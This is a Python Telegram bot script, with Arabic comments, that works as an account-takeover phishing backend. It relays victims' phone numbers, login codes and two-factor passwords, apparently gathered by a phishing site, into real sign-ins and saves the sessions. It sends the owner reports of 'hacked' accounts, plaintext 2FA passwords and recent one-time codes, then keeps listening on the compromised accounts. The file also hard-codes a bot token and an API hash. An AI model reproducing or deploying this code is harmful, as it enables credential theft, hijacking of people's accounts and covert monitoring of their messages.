import asyncio
import logging
from pathlib import Path
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# ------------------ معلوماتك ------------------
BOT_TOKEN = "8704404185:AAGe_I8kcY4qtbpzVLxpTc2seLrPHHKLsvE"
API_ID = 38269251
API_HASH = "af81ddbd39ca658e08bf7c268d6651c7"
OWNER_ID = 5843701757

# ------------------ إعدادات حفظ الجلسات ------------------
SESSIONS_DIR = Path("/storage/emulated/0/Download/bot_sessions")
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)

# ------------------ إعداد التسجيل ------------------
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ------------------ بيانات مؤقتة ------------------
user_data = {}
active_listeners = {}

# ------------------ دوال Telethon ------------------
async def get_telegram_client(session_name):
    client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
    await client.connect()
    return client

# ====================== الاستماع التلقائي (للدعم فقط) ======================
async def listen_to_account(user_id, session_file, account_name):
    """الاستماع فقط للرسائل القادمة من الدعم الفني (@Telegram)"""
    try:
        client = TelegramClient(str(session_file), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            logger.warning(f"⚠️ جلسة {user_id} غير صالحة، تم إيقاف الاستماع.")
            await bot.send_message(OWNER_ID, f"⚠️ توقف الاستماع إلى حساب {account_name}: الجلسة غير صالحة.")
            return
        
        me = await client.get_me()
        logger.info(f"🎧 بدء الاستماع إلى حساب {me.first_name} (لرسائل الدعم فقط)")
        await bot.send_message(OWNER_ID, f"🎧 بدأ الاستماع إلى حساب {me.first_name} (لرسائل الدعم الفني فقط).")
        
        # معرف حساب الدعم الفني البشري
        SUPPORT_BOT = '@Telegram'
        
        @client.on(events.NewMessage)
        async def forward_support_message(event):
            try:
                # تجاهل الرسائل الصادرة
                if event.out:
                    return
                
                # الحصول على المرسل
                sender = await event.get_sender()
                sender_id = sender.id if sender else None
                sender_username = sender.username if sender and sender.username else ""
                
                # التحقق: هل المرسل هو الدعم الفني؟
                is_support = False
                
                # طريقة 1: التحقق من اسم المستخدم
                if sender_username and sender_username.lower() == 'telegram':
                    is_support = True
                
                # طريقة 2: التحقق من المعرف (إذا كان معرف الدعم معروفاً)
                if sender_id == 777000:  # حساب النظام الآلي
                    is_support = True
                
                # إذا لم تكن الرسالة من الدعم، تجاهلها
                if not is_support:
                    return
                
                # تنسيق التقرير
                message_text = event.text or "[وسائط]"
                report = f"📞 **رسالة جديدة من الدعم الفني**\n"
                report += f"📱 الحساب المخترق: {me.first_name}\n"
                report += f"💬 المحتوى: {message_text[:500]}\n"
                report += f"⏰ الوقت: {event.date.strftime('%Y-%m-%d %H:%M:%S')}"
                
                # إرسال الرسالة إلى المالك
                await bot.send_message(OWNER_ID, report)
                
            except Exception as e:
                logger.error(f"خطأ في إعادة توجيه رسالة الدعم: {e}")
        
        await client.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"خطأ في الاستماع إلى {user_id}: {e}")
    finally:
        if user_id in active_listeners:
            del active_listeners[user_id]
            await bot.send_message(OWNER_ID, f"🔇 توقف الاستماع إلى حساب {account_name}.")
# =================================================================

# ------------------ البوت ------------------
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply("🎯 البوت جاهز لاستقبال البيانات من الموقع.")

@bot.on(events.NewMessage(pattern='/verify'))
async def handle_phone(event):
    user_id = event.sender_id
    try:
        phone = event.text.split()[1]
    except:
        await event.reply("❌ حدث خطأ. أرسل الرقم بالصيغة: /verify 213699404869")
        return
    
    user_data[user_id] = {'phone': phone, 'step': 'waiting_code'}
    client = await get_telegram_client(f"user_{user_id}")
    await client.send_code_request(phone)
    user_data[user_id]['client'] = client
    await event.reply(f"✅ تم إرسال رمز التحقق إلى {phone}.")
    logger.info(f"✅ تم إرسال طلب رمز إلى {phone}")

@bot.on(events.NewMessage(pattern='/submit_code'))
async def handle_code(event):
    user_id = event.sender_id
    try:
        code = event.text.split()[1]
    except:
        await event.reply("❌ حدث خطأ. أرسل الرمز بالصيغة: /submit_code 12345")
        return
    
    if user_id not in user_data or user_data[user_id]['step'] != 'waiting_code':
        await event.reply("❌ يرجى إرسال الرقم أولاً عبر /verify")
        return
    
    phone = user_data[user_id]['phone']
    client = user_data[user_id]['client']
    
    try:
        await client.sign_in(phone=phone, code=code)
        me = await client.get_me()
        session_path = SESSIONS_DIR / f"user_{user_id}.session"
        
        report = f"✅ *تم اختراق حساب!*\n\n👤 الاسم: {me.first_name}\n🆔 المعرف: {me.id}\n📞 الرقم: {me.phone}"
        await bot.send_message(OWNER_ID, report)
        await event.reply("✅ تم تسجيل الدخول بنجاح!")
        
        # قراءة آخر 5 رسائل من النظام الآلي
        try:
            telegram_system_id = 777000
            otp_messages = []
            async for msg in client.iter_messages(telegram_system_id, limit=5):
                otp_messages.append(f"[{msg.date.strftime('%Y-%m-%d %H:%M:%S')}] {msg.text}")
            
            if otp_messages:
                otp_report = f"🔑 **آخر رموز التحقق (OTP) التي وصلت لحساب {me.first_name}**\n\n" + "\n".join(otp_messages)
                await bot.send_message(OWNER_ID, otp_report)
        except:
            pass
        
        await client.disconnect()
        
        # بدء الاستماع التلقائي (لرسائل الدعم فقط)
        if user_id not in active_listeners:
            listener_task = asyncio.create_task(listen_to_account(user_id, session_path, me.first_name))
            active_listeners[user_id] = listener_task
        
        del user_data[user_id]
        
    except SessionPasswordNeededError:
        await event.reply("🔐 هذا الحساب محمي بـ 2FA. أرسل كلمة المرور عبر /submit_2fa")
        user_data[user_id]['step'] = 'waiting_2fa'
    except Exception as e:
        await event.reply(f"❌ فشل تسجيل الدخول: {e}")
        del user_data[user_id]

@bot.on(events.NewMessage(pattern='/submit_2fa'))
async def handle_2fa(event):
    user_id = event.sender_id
    try:
        password = event.text.split()[1]
    except:
        await event.reply("❌ حدث خطأ. أرسل كلمة المرور بالصيغة: /submit_2fa password")
        return
    
    if user_id not in user_data or user_data[user_id]['step'] != 'waiting_2fa':
        await event.reply("❌ يرجى إرسال الرقم والرمز أولاً")
        return
    
    client = user_data[user_id]['client']
    phone = user_data[user_id]['phone']
    
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        session_path = SESSIONS_DIR / f"user_{user_id}.session"
        
        report = f"✅ *تم اختراق حساب مع 2FA!*\n\n👤 الاسم: {me.first_name}\n🆔 المعرف: {me.id}\n📞 الرقم: {me.phone}\n🔐 كلمة المرور: {password}"
        await bot.send_message(OWNER_ID, report)
        await event.reply("✅ تم تسجيل الدخول بنجاح!")
        
        # قراءة آخر رسائل النظام الآلي
        try:
            telegram_system_id = 777000
            otp_messages = []
            async for msg in client.iter_messages(telegram_system_id, limit=5):
                otp_messages.append(f"[{msg.date.strftime('%Y-%m-%d %H:%M:%S')}] {msg.text}")
            if otp_messages:
                otp_report = f"🔑 **آخر رموز OTP لحساب {me.first_name}**\n\n" + "\n".join(otp_messages)
                await bot.send_message(OWNER_ID, otp_report)
        except:
            pass
        
        await client.disconnect()
        
        # بدء الاستماع التلقائي (لرسائل الدعم فقط)
        if user_id not in active_listeners:
            listener_task = asyncio.create_task(listen_to_account(user_id, session_path, me.first_name))
            active_listeners[user_id] = listener_task
        
        del user_data[user_id]
    except Exception as e:
        await event.reply(f"❌ كلمة المرور غير صحيحة: {e}")

# ====================== إيقاف الاستماع ======================
@bot.on(events.NewMessage(pattern='/stop_listen'))
async def stop_listen(event):
    if event.sender_id != OWNER_ID:
        await event.reply("⛔ هذا الأمر للمالك فقط.")
        return
    
    parts = event.text.strip().split()
    if len(parts) != 2:
        await event.reply("❌ الاستخدام: /stop_listen [معرف_الضحية]")
        return
    
    try:
        user_id = int(parts[1])
    except:
        await event.reply("❌ المعرف يجب أن يكون رقماً.")
        return
    
    if user_id in active_listeners:
        active_listeners[user_id].cancel()
        del active_listeners[user_id]
        await event.reply(f"✅ تم إيقاف الاستماع إلى الحساب {user_id}.")
    else:
        await event.reply(f"❌ لا يوجد استماع نشط للحساب {user_id}.")
# =================================================================

# ------------------ تشغيل البوت ------------------
print("🚀 البوت يعمل وينتظر البيانات...")
bot.run_until_disconnected()
